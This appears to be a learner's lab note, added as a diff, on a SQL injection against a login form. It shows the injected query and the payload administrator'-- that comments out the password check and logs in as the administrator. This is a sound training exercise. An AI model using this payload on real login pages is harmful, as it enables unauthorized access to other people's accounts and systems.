@@ -1,0 +1,10 @@
+SQL injection - login functionality
+End goal: perform SQLi attack and login as administrator user.
+
+
+Analysis:
+
+SELECT * FROM users where username='administrator'--' and password='password'
+
+username: administrator'--
+password: ''
